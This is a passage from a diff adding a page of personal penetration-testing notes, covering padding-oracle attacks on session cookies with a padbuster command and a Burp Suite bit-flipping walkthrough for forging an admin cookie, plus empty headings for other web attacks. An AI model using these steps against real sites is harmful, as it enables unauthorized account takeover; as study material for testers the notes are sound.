+<span id="cb74-7"><a href="web-vulneratilities.html#cb74-7"></a></span></code></pre></div>
+</div>
+<div id="padding-oracle-attack-padbuster" class="section level2 unnumbered">
+<h2>Padding Oracle Attack (Padbuster)</h2>
+<ol style="list-style-type: decimal">
+<li><p>Recover cookie session and name</p></li>
+<li><p>Decode cookie with padbuster</p>
+<div class="sourceCode" id="cb75"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb75-1"><a href="web-vulneratilities.html#cb75-1"></a><span class="ex">padbuster</span> http://<span class="op">&lt;</span>website_url<span class="op">&gt;</span>/login.php p4YaK6FAadDiK24eOGcORpxvxiAchu%2Fy 8 -cookie <span class="st">&quot;auth=p4YaK6FAadDiK24eOGcORpxvxiAchu%2Fy&quot;</span> -encoding 0</span></code></pre></div></li>
+</ol>
+<blockquote>
+<p>[ ! ] NOTE: If you see that the webapp is vulnerable to padding oracle attack, that the user <em>admin</em> is valid and you see that the webapp have
+a Registration page you can, you can put as a username <em>admin=</em> and you will be logged as admin manualy.</p>
+</blockquote>
+</div>
+<div id="padding-oracle-attack-bit-flipper-attack---burpsuite" class="section level2 unnumbered">
+<h2>Padding Oracle Attack (Bit Flipper Attack - BurpSuite)</h2>
+<p>The <strong>Bit Flipper attack</strong> is an attack that takes the cookie of a user created with a very similar name as the victim name and flip Bits in order to retrieve the
+desired session cookie</p>
+<ol style="list-style-type: decimal">
+<li><p>create a user name very similar as the victim (in this case bdmin for admin)</p>
+<div class="figure"><span id="fig:unnamed-chunk-9"></span>
+<img src="images/bit-flip-registration.png" alt="sql error based order by 100" width="90%" />
+<p class="caption">
+Figure 8: sql error based order by 100
+</p>
+</div></li>
+<li><p>check the session cookie of user bdmin with BurpSuite</p>
+<div class="figure"><span id="fig:unnamed-chunk-10"></span>
+<img src="images/bit-flip-checkcookie.png" alt="sql error based order by 100" width="90%" />
+<p class="caption">
+Figure 9: sql error based order by 100
+</p>
+</div></li>
+<li><p>Ctrl+i to emit that to the BurpSuite intruder and go to intruder Positions to do a Sniper Attack</p>
+<div class="figure"><span id="fig:unnamed-chunk-11"></span>
+<img src="images/bit-flip-sniperattack.png" alt="sql error based order by 100" width="90%" />
+<p class="caption">
+Figure 10: sql error based order by 100
+</p>
+</div></li>
+<li><p>Go to Payloads and select Bit flipper in payload type, Literal value in Format original data, select all the bits and uncheck Url encode these characters</p>
+<div class="figure"><span id="fig:unnamed-chunk-12"></span>
+<img src="images/bit-flip-payloadoption.png" alt="sql error based order by 100" width="90%" />
+<p class="caption">
+Figure 11: sql error based order by 100
+</p>
+</div></li>
+<li><p>Go to option and add a Grep Extract</p>
+<ul>
+<li><p>Add Grep Extract</p>
+<div class="figure"><span id="fig:unnamed-chunk-13"></span>
+<img src="images/bit-flip-addgrepextract.png" alt="sql error based order by 100" width="90%" />
+<p class="caption">
+Figure 12: sql error based order by 100
+</p>
+</div></li>
+<li><p>Fetch Response</p>
+<div class="figure"><span id="fig:unnamed-chunk-14"></span>
+<img src="images/bit-flip-fetchresponse.png" alt="sql error based order by 100" width="90%" />
+<p class="caption">
+Figure 13: sql error based order by 100
+</p>
+</div></li>
+<li><p>Generate regexp by selecting the output you want to analyse</p>
+<div class="figure"><span id="fig:unnamed-chunk-15"></span>
+<img src="images/bit-flip-selectresponse.png" alt="sql error based order by 100" width="90%" />
+<p class="caption">
+Figure 14: sql error based order by 100
+</p>
+</div></li>
+</ul></li>
+<li><p>Click on start attack button</p>
+<div class="figure"><span id="fig:unnamed-chunk-16"></span>
+<img src="images/bit-flip-startattack.png" alt="sql error based order by 100" width="90%" />
+<p class="caption">
+Figure 15: sql error based order by 100
+</p>
+</div></li>
+<li><p>Find and select a row where you see <em>You are currently logged in as admin!</em></p></li>
+</ol>
+<p>You can then copy the payload and past it in a EditThisCookie tool.</p>
+</div>
+<div id="shellshock" class="section level2 unnumbered">
+<h2>ShellShock</h2>
+</div>
+<div id="xxe-xml-external-entity-injection" class="section level2 unnumbered">
+<h2>XXE (XML External Entity Injection)</h2>
+</div>
+<div id="blind-xxe" class="section level2 unnumbered">
+<h2>Blind XXE</h2>
+</div>
+<div id="domain-zone-transfer" class="section level2 unnumbered">
+<h2>Domain Zone Transfer</h2>
+</div>
+<div id="insecure-deserialization" class="section level2 unnumbered">
+<h2>Insecure Deserialization</h2>
+</div>
+<div id="type-juggling" class="section level2 unnumbered">
+<h2>Type Juggling</h2>
+</div>
+<div id="ssti" class="section level2 unnumbered">
+<h2>SSTI</h2>
+<p>Flask/Jinja2 -&gt; Server Side Template Injection</p>
+
+</div>
+</div>
+<div class="page-inner">
+    <section class="normal" id="section-">
+        <div class="copyright">
+          &copy; 2021 - Lo0pInG 404 <a href="https://michellopez.org">[michellopez.org]</a>
+        </div>
+    </section>
+</div>
+            </section>
+
+          </div>
+        </div>
+      </div>
+<a href="searching-for-exploits.html" class="navigation navigation-prev " aria-label="Previous page"><i class="fa fa-angle-left"></i></a>
+<a href="windows-vulnerability.html" class="navigation navigation-next " aria-label="Next page"><i class="fa fa-angle-right"></i></a>
+    </div>
+  </div>
+<script src="libs/gitbook-2.6.7/js/app.min.js"></script>
+<script src="libs/gitbook-2.6.7/js/lunr.js"></script>
+<script src="libs/gitbook-2.6.7/js/clipboard.min.js"></script>
+<script src="libs/gitbook-2.6.7/js/plugin-search.js"></script>
+<script src="libs/gitbook-2.6.7/js/plugin-sharing.js"></script>
+<script src="libs/gitbook-2.6.7/js/plugin-fontsettings.js"></script>
+<script src="libs/gitbook-2.6.7/js/plugin-bookdown.js"></script>
+<script src="libs/gitbook-2.6.7/js/jquery.highlight.js"></script>
+<script src="libs/gitbook-2.6.7/js/plugin-clipboard.js"></script>
+<script>
+gitbook.require(["gitbook"], function(gitbook) {
+gitbook.start({
+"sharing": false,
+"fontsettings": {
+"theme": "night",
+"family": "sans",
+"size": 2
+},
+"edit": {
+"link": "https://github.com/mlopez66/hacking-notes/edit/master/03-Vulnerability-Assessment/03-00-web.Rmd",
+"text": "Edit"
+},
+"history": {
+"link": null,
+"text": null
+},
+"view": {
+"link": null,
+"text": null
+},
+"download": ["2021-Hacking-Notes.pdf"],
+"toc": {
+"collapse": "section",
+"scroll_highlight": true
+}
+});
+});
+</script>
+
+</body>
+
+</html>
